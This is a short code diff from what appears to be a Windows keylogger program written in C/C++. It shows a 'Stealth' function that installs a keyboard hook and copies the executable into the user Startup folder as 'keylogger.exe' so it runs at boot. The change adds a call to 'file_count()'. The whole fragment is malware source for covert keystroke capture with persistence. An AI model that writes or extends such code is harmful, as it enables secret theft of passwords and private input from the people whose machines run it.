@@ -236,11 +236,13 @@ void Stealth()
 
 	// Set the hook
 	SetHook();
-
+	
 	CopyFile("untitled1.exe", "C:\\users\\default\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\startup\\keylogger.exe", TRUE);
 	//When execute this program in administrator mode, it excutes when computer starts up.
 	MSG msg;
 	//system("copy Untitled1.exe C:\\Users\\default\\AppData\\Roaming\\Microsoft\\Windows\\");
+	 
+	 file_count();
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
 	}
